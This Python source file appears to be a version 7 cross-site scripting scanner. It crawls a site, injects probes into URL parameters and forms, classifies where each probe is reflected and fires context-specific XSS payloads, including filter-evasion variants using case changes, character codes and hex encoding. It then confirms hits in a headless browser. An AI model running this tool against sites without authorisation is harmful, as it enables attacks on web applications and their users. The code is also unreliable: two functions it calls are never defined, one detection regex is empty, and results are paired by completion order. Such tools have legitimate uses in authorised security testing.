# scanner.py (v7)
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote
import argparse
import sys
import time # For rate limiting
from collections import deque
import concurrent.futures
import os
import re
import uuid

# Selenium imports
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.common.exceptions import (
    TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException,
    NoSuchElementException, WebDriverException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from webdriver_manager.chrome import ChromeDriverManager

# --- Configuration ---
DOM_PAYLOAD_ATTRIBUTE = 'data-xss-success'
DOM_PAYLOAD_VALUE = 'true'
CONFIRMATION_WAIT_TIMEOUT = 3
MAX_WORKERS = 10
UNIQUE_PROBE_PREFIX = "xSsPrObE"

# --- Context-Specific Payloads (v7 - Enhanced with Basic Evasion) ---

# Base execution functions (alert or DOM change)
ALERT_EXEC = "alert('XSS_A')"
DOM_CHANGE_EXEC = f"document.body.setAttribute('{DOM_PAYLOAD_ATTRIBUTE}','{DOM_PAYLOAD_VALUE}')"
ALERT_FROM_CHAR_CODE = "alert(String.fromCharCode(88,83,83,95,67))" # alert('XSS_C')
DOM_CHANGE_FROM_CHAR_CODE = f"document.body.setAttribute(String.fromCharCode(100,97,116,97,45,120,115,115,45,115,117,99,99,101,115,115), String.fromCharCode(116,114,117,101))" # data-xss-success = true

# Payloads targeting alert()
ALERT_PAYLOADS = [
    f"<script>{ALERT_EXEC}</script>",
    f"<Script>{ALERT_EXEC}</sCriPt>", # Case variation
    f"<img src=x onerror={ALERT_EXEC}>",
    f"<iMg sRc=x OnErroR={ALERT_EXEC}>", # Case variation
    f"<img src=x onerror={ALERT_FROM_CHAR_CODE}>", # Char code
    f"<svg onload={ALERT_EXEC}>",
    f"<SvG oNlOaD={ALERT_EXEC}>", # Case variation
    f"<svg onload={ALERT_FROM_CHAR_CODE}>", # Char code
    f"<details open ontoggle={ALERT_EXEC}><summary>T</summary></details>",
    f"<details open ontoggle={ALERT_FROM_CHAR_CODE}><summary>T</summary></details>", # Char code
    f"<body onload={ALERT_EXEC}>", # Less reliable trigger
    f"<input autofocus onfocus={ALERT_EXEC}>",
    f"<input autofocus onfocus={ALERT_FROM_CHAR_CODE}>", # Char code
    f"<a href=\"javascript:{ALERT_EXEC}\">Click</a>",
    f"<a href=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;{ALERT_EXEC}\">Click</a>", # Hex encoded javascript:
]

# Payloads targeting DOM change
DOM_CHANGE_PAYLOADS = [
    f"<img src=x onerror=\"{DOM_CHANGE_EXEC}\">",
    f"<iMg sRc=x oNeRrOr=\"{DOM_CHANGE_EXEC}\">", # Case variation
    f"<img src=x onerror='{DOM_CHANGE_EXEC}'>", # Single quotes
    f"<img src=x onerror={DOM_CHANGE_FROM_CHAR_CODE}>", # Char code
    f"<svg onload=\"{DOM_CHANGE_EXEC}\">",
    f"<SvG oNlOaD=\"{DOM_CHANGE_EXEC}\">", # Case variation
    f"<svg onload='{DOM_CHANGE_EXEC}'>", # Single quotes
    f"<svg onload={DOM_CHANGE_FROM_CHAR_CODE}>", # Char code
    f"<details open ontoggle=\"{DOM_CHANGE_EXEC}\"><summary>T</summary></details>",
    f"<details open ontoggle={DOM_CHANGE_FROM_CHAR_CODE}><summary>T</summary></details>", # Char code
    f"<input autofocus onfocus=\"{DOM_CHANGE_EXEC}\">",
    f"<input autofocus onfocus={DOM_CHANGE_FROM_CHAR_CODE}>", # Char code
]

# Combine base execution payloads
EXECUTION_PAYLOADS = ALERT_PAYLOADS + DOM_CHANGE_PAYLOADS

# Context dictionary using combined execution payloads
CONTEXT_PAYLOADS = {
    "HTML_TEXT": EXECUTION_PAYLOADS,
    "HTML_ATTR_DQ": [f'">{p}' for p in EXECUTION_PAYLOADS] + \
                    [f'" autofocus onfocus="{ALERT_FROM_CHAR_CODE}"',
                     f'" onmouseover="{DOM_CHANGE_EXEC}"'], # Added more events
    "HTML_ATTR_SQ": [f"'>{p}" for p in EXECUTION_PAYLOADS] + \
                    [f"' autofocus onfocus='{ALERT_FROM_CHAR_CODE}'",
                     f"' onmouseover='{DOM_CHANGE_EXEC}'"], # Added more events
    "HTML_ATTR_UQ": [f" autofocus onfocus={ALERT_EXEC}", # Needs space before event
                     f" onmouseover={ALERT_EXEC}",
                     f" onload={ALERT_EXEC}",
                     f" autofocus onfocus={DOM_CHANGE_EXEC}",
                     f" onmouseover={DOM_CHANGE_EXEC}"],
    "SCRIPT_STRING_DQ": [f'";{ALERT_EXEC};//',
                         f'";{DOM_CHANGE_EXEC};//',
                         f'";eval("{ALERT_FROM_CHAR_CODE}");//'], # Eval char code
    "SCRIPT_STRING_SQ": [f"';{ALERT_EXEC};//",
                         f"';{DOM_CHANGE_EXEC};//",
                         f"';eval('{ALERT_FROM_CHAR_CODE}');//"], # Eval char code
    "SCRIPT_BLOCK": [f"{ALERT_EXEC};",
                     f"{DOM_CHANGE_EXEC};",
                     f"eval({ALERT_FROM_CHAR_CODE});"], # Eval char code
    "HTML_COMMENT": [f"--><img src=x onerror={ALERT_EXEC}>", # Break out of comment
                     f"--><svg onload={DOM_CHANGE_EXEC}>"],
    # Add CSS_BLOCK, HTML_TAG_DEFINITION later if needed
    "UNKNOWN": EXECUTION_PAYLOADS # Fallback
}

# Default payload list if file loading fails or not provided
DEFAULT_PAYLOADS = EXECUTION_PAYLOADS

# --- Helper Functions ---
# load_payloads, setup_driver, confirm_xss_with_headless, get_links,
# get_forms, get_form_details, analyze_reflection_context
# (These functions remain the same as v6 - no changes needed here)
def load_payloads(filepath):
    """Loads payloads from a file, one per line."""
    try:
        if not os.path.exists(filepath):
             print(f"[!] Payload file not found: {filepath}", file=sys.stderr)
             return None
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        if not payloads:
             print(f"[!] No valid payloads found in file: {filepath}", file=sys.stderr)
             return None
        print(f"[*] Loaded {len(payloads)} payloads from {filepath}")
        return payloads
    except IOError as e:
        print(f"[!] Error reading payload file {filepath}: {e}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Unexpected error loading payload file {filepath}: {e}", file=sys.stderr)
        return None

def setup_driver():
    """Sets up the Selenium WebDriver."""
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    try:
        os.environ['WDM_LOG_LEVEL'] = '0'
        service = ChromeService(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.set_page_load_timeout(15)
        return driver
    except ValueError as ve:
         print(f"[!] WebDriver Manager Error: {ve}. Check network or cache.", file=sys.stderr)
         return None
    except WebDriverException as wde:
        print(f"[!] WebDriver Error during setup: {wde}", file=sys.stderr)
        return None
    except Exception as e:
        print(f"[!] Failed to set up Selenium WebDriver: {e}", file=sys.stderr)
        return None

def confirm_xss_with_headless(url, driver, payload_description=""):
    """Uses Selenium to visit a URL and check for an alert OR specific DOM change."""
    if not driver: return None, None
    # print(f"  [*] Attempting headless confirmation: {payload_description} -> {url[:100]}...") # Reduce noise
    confirmation_type = None; confirmation_detail = ""
    try:
        driver.get(url); time.sleep(0.1) # Small delay might help JS execution
        try: # Alert Check
            WebDriverWait(driver, CONFIRMATION_WAIT_TIMEOUT).until(EC.alert_is_present())
            alert = driver.switch_to.alert; alert_text = alert.text
            confirmation_detail = f"Alert('{alert_text}')"; print(f"  [+] CONFIRMED via Alert: {confirmation_detail} ({payload_description})")
            alert.accept(); confirmation_type = "Alert"; return confirmation_type, confirmation_detail
        except TimeoutException: pass
        except UnexpectedAlertPresentException:
            try:
                alert = driver.switch_to.alert; alert_text = alert.text
                confirmation_detail = f"Unexpected Alert('{alert_text}')"; print(f"  [+] CONFIRMED via Unexpected Alert: {confirmation_detail} ({payload_description})")
                alert.accept(); confirmation_type = "Alert (Unexpected)"; return confirmation_type, confirmation_detail
            except NoAlertPresentException: print("  [!] Alert disappeared before handling.", file=sys.stderr)
        if not confirmation_type: # DOM Check
            try:
                WebDriverWait(driver, 0.5).until(lambda d: d.find_element(By.TAG_NAME, 'body').get_attribute(DOM_PAYLOAD_ATTRIBUTE) == DOM_PAYLOAD_VALUE)
                confirmation_detail = f"DOM attribute '{DOM_PAYLOAD_ATTRIBUTE}'='{DOM_PAYLOAD_VALUE}'"; print(f"  [+] CONFIRMED via DOM Change: {confirmation_detail} ({payload_description})")
                confirmation_type = "DOM Change"; return confirmation_type, confirmation_detail
            except TimeoutException: pass
            except NoSuchElementException: pass # Body not found or attribute not set
            except Exception as e_dom: print(f"  [!] Error during DOM check: {e_dom}", file=sys.stderr)
        return None, None # Not confirmed
    except TimeoutException: print(f"  [!] Page load timed out during confirmation: {url[:100]}", file=sys.stderr); return None, None
    except WebDriverException as wde:
         if "net::ERR_INVALID_URL" in str(wde): print(f"  [!] Invalid URL generated for confirmation: {url[:100]}", file=sys.stderr)
         # else: print(f"  [!] WebDriver error during confirmation for {url[:100]}: {wde}", file=sys.stderr) # Reduce noise
         return None, None
    except Exception as e: print(f"  [!] Unexpected error during headless confirmation for {url[:100]}: {e}", file=sys.stderr); return None, None

def get_links(url, session, base_domain):
    """Fetches and parses HTML to find all valid links on the same domain."""
    links = set()
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return set()
        soup = BeautifulSoup(response.content, 'html.parser')
        for a_tag in soup.find_all('a', href=True):
            href = a_tag['href']
            try:
                if href.strip().lower().startswith('javascript:'): continue
                full_url = urljoin(url, href); parsed_link = urlparse(full_url)
                if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == base_domain:
                    links.add(parsed_link._replace(fragment='').geturl())
            except ValueError: pass
        return links
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching links from {url}", file=sys.stderr); return set()
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching links from {url}: {e}", file=sys.stderr); return set()
    except Exception as e: print(f"[!] Error parsing links from {url}: {e}", file=sys.stderr); return set()

def get_forms(url, session):
    """Fetches and parses HTML to find all forms."""
    try:
        response = session.get(url, timeout=10); response.raise_for_status()
        content_type = response.headers.get('content-type', '').lower()
        if 'html' not in content_type: return []
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.exceptions.Timeout: print(f"[!] Timeout fetching forms from {url}", file=sys.stderr); return []
    except requests.exceptions.RequestException as e: print(f"[!] Error fetching forms from {url}: {e}", file=sys.stderr); return []
    except Exception as e: print(f"[!] Error parsing forms from {url}: {e}", file=sys.stderr); return []

def get_form_details(form):
    """Extracts details from a form element."""
    details = {}; action = form.attrs.get('action', ''); method = form.attrs.get('method', 'get').lower(); inputs = []
    try:
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.attrs.get('name');
            if input_name is None: continue
            input_type = input_tag.attrs.get('type', 'text').lower(); input_value = input_tag.attrs.get('value', '')
            if input_tag.name == 'select' and not input_value:
                 option = input_tag.find('option', selected=True);
                 if not option: option = input_tag.find('option')
                 if option: input_value = option.attrs.get('value', option.text)
            inputs.append({'type': input_type, 'name': input_name, 'value': input_value})
    except Exception as e: print(f"[!] Error parsing inputs for a form: {e}", file=sys.stderr)
    details['action'] = action; details['method'] = method; details['inputs'] = inputs; return details

def analyze_reflection_context(html_content, probe):
    """Analyzes HTML to guess the context of the reflected probe string."""
    # (Same basic heuristic logic as v6)
    contexts = set()
    for match in re.finditer(re.escape(probe), html_content):
        start, end = match.span()
        window_start = max(0, start - 70); window_end = min(len(html_content), end + 70)
        window = html_content[window_start:window_end]; probe_in_window_start = start - window_start
        script_match = re.search(r'<script.*?>.*?</script>', window, re.IGNORECASE | re.DOTALL)
        if script_match and script_match.start() < probe_in_window_start < script_match.end():
            script_content_before_probe = window[script_match.start():probe_in_window_start]
            last_dq = script_content_before_probe.rfind('"'); last_sq = script_content_before_probe.rfind("'"); last_nl = script_content_before_probe.rfind('\n')
            if last_dq > last_sq and last_dq > last_nl: contexts.add("SCRIPT_STRING_DQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
            elif last_sq > last_dq and last_sq > last_nl: contexts.add("SCRIPT_STRING_SQ" if start > 0 and html_content[start-1] != '\\' else "SCRIPT_BLOCK")
            else: contexts.add("SCRIPT_BLOCK")
            continue
        attr_match_dq = re.search(r'([\w-]+)\s*=\s*"\s*[^"]*$', html_content[window_start:start])
        attr_match_sq = re.search(r'([\w-]+)\s*=\s*\'\s*[^\']*$', html_content[window_start:start])
        attr_match_uq = re.search(r'([\w-]+)\s*=\s*([^\s>\'"]*)$', html_content[window_start:start])
        if attr_match_dq and end < len(html_content) and html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_DQ"); continue
        if attr_match_sq and end < len(html_content) and html_content[end:].lstrip().startswith("'"): contexts.add("HTML_ATTR_SQ"); continue
        if attr_match_uq and end < len(html_content) and re.match(r'[\s/>]', html_content[end:].lstrip()):
             if not html_content[end:].lstrip().startswith("'") and not html_content[end:].lstrip().startswith('"'): contexts.add("HTML_ATTR_UQ"); continue
        comment_match = re.search(r'', window, re.DOTALL) # Corrected regex
        if comment_match and comment_match.start() < probe_in_window_start < comment_match.end(): contexts.add("HTML_COMMENT"); continue
        style_match = re.search(r'<style.*?>.*?</style>', window, re.IGNORECASE | re.DOTALL)
        if style_match and style_match.start() < probe_in_window_start < style_match.end(): contexts.add("CSS_BLOCK"); continue
        tag_match = re.search(r'<[\w-]+[^>]*$', html_content[window_start:start])
        if tag_match and end < len(html_content) and html_content[end:].lstrip().startswith('>'): contexts.add("HTML_TAG_DEFINITION"); continue
        if not contexts: contexts.add("HTML_TEXT")
    if not contexts: return ["UNKNOWN"]
    # Prioritization logic (same as v6)
    if "SCRIPT_STRING_DQ" in contexts: return ["SCRIPT_STRING_DQ"]
    if "SCRIPT_STRING_SQ" in contexts: return ["SCRIPT_STRING_SQ"]
    if "SCRIPT_BLOCK" in contexts: return ["SCRIPT_BLOCK"]
    if "HTML_ATTR_DQ" in contexts: return ["HTML_ATTR_DQ"]
    if "HTML_ATTR_SQ" in contexts: return ["HTML_ATTR_SQ"]
    if "HTML_ATTR_UQ" in contexts: return ["HTML_ATTR_UQ"]
    if "HTML_COMMENT" in contexts: return ["HTML_COMMENT"]
    if "CSS_BLOCK" in contexts: return ["CSS_BLOCK"]
    if "HTML_TAG_DEFINITION" in contexts: return ["HTML_TAG_DEFINITION"]
    if "HTML_TEXT" in contexts: return ["HTML_TEXT"]
    return list(contexts)


# --- Functions for Context-Aware Reflected Scanning ---

# task_inject_and_confirm remains the same as v6
def task_inject_and_confirm(url, injection_point_type, param_or_form_details, payload, session, driver):
    """Task: Injects a specific payload and performs headless confirmation."""
    test_url = None; response_body = None; final_url = None
    result_base = {'payload': payload, 'confirmed': False}
    try:
        if injection_point_type == 'URL_PARAM':
            param_name = param_or_form_details['name']; parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query)
            if param_name not in query_params: return None
            modified_params = query_params.copy(); modified_params[param_name] = [payload]
            modified_query = urlencode(modified_params, doseq=True); test_url = parsed_url._replace(query=modified_query).geturl()
            response = session.get(test_url, timeout=10, allow_redirects=True); final_url = response.url
            result_base.update({'type': 'URL Parameter', 'url': url, 'parameter': param_name, 'final_url': final_url})
        elif injection_point_type == 'FORM':
            form_details = param_or_form_details; target_url = urljoin(url, form_details['action'])
            inputs = form_details['inputs']; data = {}; tested_fields = []
            for input_item in inputs:
                if not input_item.get('name'): continue
                if input_item['type'] in ['text', 'search', 'url', 'email', 'tel', 'password', 'textarea', 'hidden']:
                    data[input_item['name']] = payload; tested_fields.append(input_item['name'])
                else: data[input_item['name']] = input_item['value']
            if not tested_fields: return None
            if form_details['method'] == 'post': response = session.post(target_url, data=data, timeout=10, allow_redirects=True)
            else: response = session.get(target_url, params=data, timeout=10, allow_redirects=True)
            final_url = response.url
            result_base.update({'type': 'Form Input', 'url': url, 'action': form_details['action'], 'method': form_details['method'], 'fields': tested_fields, 'final_url': final_url})
        else: return None
        if driver and final_url:
            confirmation_type, confirmation_detail = confirm_xss_with_headless(final_url, driver, payload_description=f"{result_base['type']} Payload: {payload[:50]}...")
            if confirmation_type:
                result_base['confirmed'] = True; result_base['confirmation_type'] = confirmation_type; result_base['confirmation_detail'] = confirmation_detail
                return result_base
        return None
    except requests.exceptions.Timeout: return None
    except requests.exceptions.RequestException: return None
    except Exception as e: print(f"  [!] Error in task_inject_and_confirm for {payload[:50]}: {e}", file=sys.stderr); return None

# scan_page_reflected_context_aware remains the same as v6
def scan_page_reflected_context_aware(url, session, driver, executor, full_payload_list):
    """Scans a single page for REFLECTED XSS using context analysis."""
    print(f"[*] Scanning (Context-Aware Reflected) {url}...")
    confirmed_vulnerabilities = []; probe = f"{UNIQUE_PROBE_PREFIX}{uuid.uuid4().hex[:8]}"
    injection_points = []; param_probe_results = {}; form_probe_results = {}; form_details_list = []
    # --- 1. Probe Injection Points ---
    parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query); probe_futures = []
    if query_params: # Probe URL Params
        # print(f"  [*] Probing {len(query_params)} URL parameters...")
        for param_name in query_params.keys():
            if not query_params[param_name]: continue
            probe_futures.append(executor.submit(task_test_url_param, url, param_name, probe, session))
            injection_points.append({'type': 'URL_PARAM', 'details': {'name': param_name}})
        for i, future in enumerate(concurrent.futures.as_completed(probe_futures)):
             param_name = list(query_params.keys())[i] # Fragile assumption
             probe_result = future.result()
             if probe_result and probe in probe_result.get('response_body', ''):
                  param_probe_results[param_name] = (probe_result['response_body'], probe_result['final_url'])
                  # print(f"    [+] Probe reflected in parameter: {param_name}")
    probe_futures = [] # Reset for forms
    forms = get_forms(url, session)
    if forms: # Probe Forms
        # print(f"  [*] Probing {len(forms)} forms...")
        for i, form in enumerate(forms):
            details = get_form_details(form);
            if not details['inputs']: continue
            form_details_list.append(details) # Store details for later mapping
            probe_futures.append(executor.submit(task_test_form, details, url, probe, session))
            injection_points.append({'type': 'FORM', 'details': details})
        for i, future in enumerate(concurrent.futures.as_completed(probe_futures)):
             form_details = form_details_list[i] # Assuming order matches submission
             probe_result = future.result()
             if probe_result and probe in probe_result.get('response_body', ''):
                  form_probe_results[i] = (probe_result['response_body'], probe_result['final_url']) # Use index as key
                  # print(f"    [+] Probe reflected in form: Action='{form_details['action']}', Method='{form_details['method']}'")
    # --- 2. Analyze Context and Launch Exploit Payloads ---
    exploit_futures = []
    if not driver: print("  [*] Skipping exploit phase as headless browser is disabled."); return []
    # print(f"  [*] Analyzing context and launching exploits...")
    processed_probes = 0
    # URL Params Exploitation
    for param_name, (response_body, final_url) in param_probe_results.items():
        processed_probes += 1
        contexts = analyze_reflection_context(response_body, probe)
        # print(f"    - Param '{param_name}': Detected context(s): {contexts}")
        payloads_to_try = set()
        for ctx in contexts: payloads_to_try.update(CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS["UNKNOWN"]))
        # print(f"      -> Trying {len(payloads_to_try)} context-specific payloads for '{param_name}'...")
        param_details = {'name': param_name}
        for payload in payloads_to_try: exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'URL_PARAM', param_details, payload, session, driver))
    # Forms Exploitation
    for i, (response_body, final_url) in form_probe_results.items():
        processed_probes += 1
        form_details = form_details_list[i] # Retrieve details using index
        contexts = analyze_reflection_context(response_body, probe)
        # print(f"    - Form (Action='{form_details['action']}'): Detected context(s): {contexts}")
        payloads_to_try = set()
        for ctx in contexts: payloads_to_try.update(CONTEXT_PAYLOADS.get(ctx, CONTEXT_PAYLOADS["UNKNOWN"]))
        # print(f"      -> Trying {len(payloads_to_try)} context-specific payloads for form...")
        for payload in payloads_to_try: exploit_futures.append(executor.submit(task_inject_and_confirm, url, 'FORM', form_details, payload, session, driver))
    # --- 3. Collect Confirmed Vulnerabilities ---
    if exploit_futures:
        print(f"[*] Waiting for {len(exploit_futures)} context-aware exploit checks from {processed_probes} reflection points...")
        processed_count = 0
        for future in concurrent.futures.as_completed(exploit_futures):
            processed_count += 1
            result = future.result()
            if result and result.get('confirmed'):
                confirmed_vulnerabilities.append(result)
                # print(f"  [+] CONFIRMED Vulnerability found via context-aware check!") # Reduce noise
            # Progress indicator?
        print(f"[*] Context-aware exploit checks complete for {url}. Confirmed {len(confirmed_vulnerabilities)}.")
    return confirmed_vulnerabilities


# scan_for_dom_xss remains the same as v5
def scan_for_dom_xss(url, driver, payload_list):
    """Scans for DOM XSS by injecting payloads into the URL fragment."""
    if not driver: return []
    print(f"[*] Scanning (DOM XSS via Hash) {url}...")
    confirmed_dom_vulns = []; base_url = url.split('#')[0]
    for payload in payload_list:
        try:
             encoded_payload = quote(payload, safe=':/~?=&%')
             test_url = f"{base_url}#{encoded_payload}"
        except Exception as e_quote: print(f"  [!] Error encoding payload for URL hash: {payload[:50]}... ({e_quote})", file=sys.stderr); continue
        confirmation_type, confirmation_detail = confirm_xss_with_headless(test_url, driver, payload_description=f"Hash Payload: {payload[:50]}...")
        if confirmation_type:
            confirmed_dom_vulns.append({'type': 'DOM-based XSS', 'url': url, 'source': 'URL Fragment (#)', 'payload': payload, 'confirmed': True, 'confirmation_type': confirmation_type, 'confirmation_detail': confirmation_detail, 'final_url': test_url})
            # break # Optional optimization
    # print(f"[*] DOM XSS Scan complete for {url}. Found {len(confirmed_dom_vulns)} confirmed.") # Reduce noise
    return confirmed_dom_vulns


# --- Crawler ---
# Added delay parameter
def crawl(start_url, max_depth, session, driver, executor, payload_list, delay):
    """Performs a breadth-first crawl and scan (Context-Aware Reflected + DOM)."""
    if max_depth <= 0: max_depth = 1
    base_domain = urlparse(start_url).netloc
    if not base_domain: print(f"[!] Could not determine base domain for URL: {start_url}", file=sys.stderr); return []

    queue = deque([(start_url, 0)]); visited = {start_url}; all_vulnerabilities = []

    while queue:
        current_url, current_depth = queue.popleft()
        print(f"\n--- Scanning URL: {current_url} (Depth: {current_depth}) ---")
        if current_depth >= max_depth: continue

        # --- Apply Delay ---
        if delay > 0:
            print(f"[*] Delaying for {delay} second(s)...")
            time.sleep(delay)

        # --- Scan for Context-Aware Reflected XSS ---
        confirmed_reflected = scan_page_reflected_context_aware(current_url, session, driver, executor, payload_list)
        all_vulnerabilities.extend(confirmed_reflected)

        # --- Scan for DOM XSS ---
        if driver:
             confirmed_dom = scan_for_dom_xss(current_url, driver, payload_list)
             all_vulnerabilities.extend(confirmed_dom)
        # else: print("[*] Skipping DOM XSS checks as headless browser is disabled.") # Already handled in func

        # --- Find Links ---
        if current_depth < max_depth - 1:
            print(f"[*] Discovering links on {current_url}...")
            new_links = get_links(current_url, session, base_domain); added_count = 0
            for link in new_links:
                if link not in visited: visited.add(link); queue.append((link, current_depth + 1)); added_count += 1
            if added_count > 0: print(f"  - Added {added_count} new links to queue (Depth {current_depth + 1})")

    print(f"\n[*] Crawler finished. Visited {len(visited)} unique URLs.")
    return all_vulnerabilities


# --- Entry Point ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Scanner v7 (Evasion Payloads & Rate Limiting) - Use Responsibly!")
    # Arguments
    parser.add_argument("url", help="The starting URL to scan")
    parser.add_argument("-d", "--depth", type=int, default=2, help="Maximum crawl depth (default: 2)")
    parser.add_argument("--no-headless", action="store_true", help="Disable headless browser confirmation AND context-aware/DOM checks")
    parser.add_argument("-w", "--workers", type=int, default=MAX_WORKERS, help=f"Number of concurrent workers (default: {MAX_WORKERS})")
    parser.add_argument("-pL", "--payload-list", help="Path to payload file (used for DOM scan and fallback)")
    # Added delay argument
    parser.add_argument("--delay", type=float, default=0, help="Delay in seconds between requests to a page (default: 0)")


    args = parser.parse_args()
    target_url = args.url; max_depth = args.depth; use_headless = not args.no_headless; num_workers = args.workers; payload_file = args.payload_list; request_delay = args.delay

    if request_delay < 0:
        print("[!] Delay cannot be negative. Setting to 0.", file=sys.stderr)
        request_delay = 0

    # Load payloads
    payloads_to_use = DEFAULT_PAYLOADS
    if payload_file:
        loaded_payloads = load_payloads(payload_file)
        if loaded_payloads: payloads_to_use = loaded_payloads
        else: print("[!] Failed to load payloads from file, using default list.", file=sys.stderr)
    else: print("[*] No payload list provided, using default list for DOM/fallback.")


    # Setup Selenium Driver
    driver = None
    if use_headless:
        print("[*] Setting up headless browser (Selenium)...")
        driver = setup_driver()
        if not driver: print("[!] Proceeding without headless features."); use_headless = False
    else: print("[*] Headless features disabled via command line.")

    # Use a session object
    session = requests.Session(); session.headers.update({'User-Agent': 'XSSScanner/0.7 (+https://github.com/your-repo)'}) # Update version

    start_time = time.time()

    # Create ThreadPoolExecutor
    all_confirmed_vulns = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # Pass delay to crawl function
        all_confirmed_vulns = crawl(target_url, max_depth, session, driver, executor, payloads_to_use, request_delay)

    end_time = time.time()

    # --- Reporting ---
    print("\n--- Scan Summary ---")
    if all_confirmed_vulns:
        print(f"\n[***] Found {len(all_confirmed_vulns)} CONFIRMED XSS vulnerabilities:")
        all_confirmed_vulns.sort(key=lambda x: (x['url'], x['type']))
        for vuln in all_confirmed_vulns:
             base_info = f"Type: {vuln['type']}, Confirm: {vuln.get('confirmation_type', 'N/A')} ({vuln.get('confirmation_detail', 'N/A')}), Payload: {vuln['payload']}"
             if vuln['type'] == 'URL Parameter':
                 print(f"  - URL: {vuln['url']}, Param: {vuln['parameter']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'Form Input':
                  print(f"  - URL: {vuln['url']}, Form Action: {vuln['action']}, Method: {vuln['method']}, Fields: {vuln['fields']}, {base_info}, Final URL: {vuln['final_url']}")
             elif vuln['type'] == 'DOM-based XSS':
                  print(f"  - URL: {vuln['url']}, Source: {vuln['source']}, {base_info}, Trigger URL: {vuln['final_url']}")
             else: print(f"  - {vuln}")
    else:
        print("\n[*] No vulnerabilities confirmed via headless browser.")
        if not use_headless: print("    (Headless confirmation, context-aware checks, and DOM XSS checks were disabled.)")

    print(f"\n--- Scan Finished in {end_time - start_time:.2f} seconds ---")

    # Cleanup
    if driver: print("[*] Closing headless browser..."); driver.quit()

